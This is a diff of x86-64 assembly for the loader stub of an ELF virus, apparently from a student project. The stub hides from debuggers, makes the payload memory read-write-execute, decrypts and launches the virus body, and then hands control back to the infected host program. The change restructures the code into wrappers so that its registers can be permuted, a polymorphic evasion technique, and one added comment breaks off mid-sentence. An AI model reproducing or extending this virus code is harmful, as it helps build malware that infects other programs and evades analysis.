@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/27 02:41:01 by anselme          ###   ########.fr        ;
+;    Updated: 2020/01/02 21:21:07 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -39,6 +39,8 @@ virus_header_struct:
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
 ; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
 ; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
+;
+; The code from mark_below to
 mark_below:
 	pop rax
 	push rdx                   ; backup rdx
@@ -65,18 +67,17 @@ mark_below:
 	mov rax, rdx               ; get loader_entry addr
 	sub rax, virus_header_struct - loader_entry
 
-	push r15                   ; backup r15
-	mov r15, rax
-	xchg r15, r8
-	sub r8, r15                ; r8 = rax - r8
-	mov r15, rax
-	xchg r15, r10
-	add r10, r15               ; r10 = rax + r10
-	mov r15, rax
-	xchg r15, r11
-	sub r11, r15               ; r11 = rax - r11
-	pop r15                    ; restore r15
+	mov rcx, rax
+	xchg rcx, r8
+	sub r8, rcx                ; r8 = rax - r8
+	mov rcx, rax
+	xchg rcx, r10
+	add r10, rcx               ; r10 = rax + r10
+	mov rcx, rax
+	xchg rcx, r11
+	sub r11, rcx               ; r11 = rax - r11
 
+	push r14                   ; save virus size    [rsp + 48]
 	push rax                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
@@ -85,38 +86,18 @@ mark_below:
 	push rdx                   ; save seed          [rsp]
 ;------------------------------; Show-off
 %ifdef DEBUG
-	mov rax, 0x00000a2e2e2e2e59
-	push rax
-	mov rax, 0x444f4f572e2e2e2e
-	push rax
-
-	; write(1, "....WOODY....\n", 14);
-	mov rdi, STDOUT
-	mov rsi, rsp
-	mov rdx, 14
-	mov rax, SYSCALL_WRITE
-	syscall
-
-	add rsp, 16
+	jmp wrap_woody
+after_woody:
 %endif
 ;------------------------------; check if client behaves well
-	call detect_spy
-	test rax, rax
-	jnz return_to_client
+	jmp wrap_anti_debug
+after_anti_debug:
 ;------------------------------; make ptld writable
-	mov r8, [rsp + 32]         ; get ptld addr
-	mov r9, [rsp + 24]         ; get ptld len
-
-	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
-
-	mov rdi, r8
-	mov rsi, r9
-	mov rdx, PROT_RWX
-	mov rax, SYSCALL_MPROTECT
-	syscall
+	jmp wrap_mprotect
+after_mprotect:
 ;------------------------------; decypher virus
 	mov rdi, [rsp + 16]        ; get virus_addr
-	mov rsi, r14               ; get virus_size
+	mov rsi, [rsp + 48]        ; get virus_size
 
 	call decypher
 ;------------------------------; launch virus
@@ -124,8 +105,45 @@ mark_below:
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
-	add rsp, 48                ; restore stack as it was
+	add rsp, 56                ; restore stack as it was
 	pop r14                    ; restore r14
 	pop rdx                    ; restore rdx
 	push r11
 	ret
+
+end_of_reg_permutable_code:
+;------------------------------;
+; Non reg-permutable procedures
+;------------------------------; anti-debug wrapper
+wrap_anti_debug:
+	call detect_spy
+	test rax, rax
+	jnz return_to_client
+	jmp after_anti_debug
+;------------------------------; mprotect wrapper
+wrap_mprotect:
+	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
+	mov rdi, [rsp + 32]        ; get ptld addr
+	mov rsi, [rsp + 24]        ; get ptld len
+	mov rdx, PROT_RWX
+	mov rax, SYSCALL_MPROTECT
+	syscall
+	jmp after_mprotect
+;------------------------------; write woody wrapper
+%ifdef DEBUG
+wrap_woody:
+	; write(1, "....WOODY....\n", 14);
+	mov rax, 0x00000a2e2e2e2e59
+	push rax
+	mov rax, 0x444f4f572e2e2e2e
+	push rax
+	mov rdi, STDOUT
+	mov rsi, rsp
+	mov rdx, 14
+	mov rax, SYSCALL_WRITE
+	syscall
+
+	add rsp, 16
+	jmp after_woody
+%endif
+end_of_reg_non_permutable_code:
